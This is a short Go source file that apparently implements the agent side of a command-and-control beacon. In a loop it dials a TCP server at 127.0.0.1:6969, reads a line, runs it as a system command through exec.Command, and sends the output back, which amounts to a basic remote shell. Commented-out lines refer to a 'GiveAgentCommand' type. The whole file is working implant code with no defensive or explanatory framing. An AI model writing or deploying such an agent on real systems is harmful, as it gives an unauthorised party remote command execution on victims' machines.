package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"
)

func main() {
	// beacon, err := net.Dial("tcp", "127.0.0.1:6969")
	// if err != nil {
	// 	log.Fatalln(err) // maybe try diff IP
	// }
	// dec := gob.NewDecoder(beacon)
	// instruct := &types.GiveAgentCommand{}
	// dec.Decode(instruct)
	// fmt.Printf("Received : %+v", instruct)

	for {
		beacon, err := net.Dial("tcp", "127.0.0.1:6969")
		if err != nil {
			log.Fatalln(err) // maybe try diff IP
		}
		err = beacon.SetReadDeadline(time.Now().Add(time.Minute * 5))
		if err != nil {
			log.Fatalln(err)
		}
		CmdOut := ""
		text := make([]byte, 4096)
		_, err = beacon.Read(text)
		if err != nil {
			log.Println("No conn beacon in 5 sec")
			time.Sleep(time.Second * 5)
			continue
		}
		out := string(text)
		message := strings.Split(out, "\n")
		if message[0] != "" {
			fmt.Print("->: " + message[0])
			tokens := strings.Split(message[0], " ")
			var c *exec.Cmd
			if len(tokens) == 1 {
				c = exec.Command(tokens[0])
			} else {
				c = exec.Command(tokens[0], tokens[1:]...)
			}
			buf, err := c.CombinedOutput()
			if err != nil {
				CmdOut = err.Error()
			}
			CmdOut += string(buf)
			beacon.Write(buf)
			continue
		}
		// dec := gob.NewDecoder(beacon)
		// instruct := &types.GiveAgentCommand{}
		// dec.Decode(instruct)
		// fmt.Printf("Received : %+v", instruct)

		if strings.TrimSpace(string(CmdOut)) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
	}

}
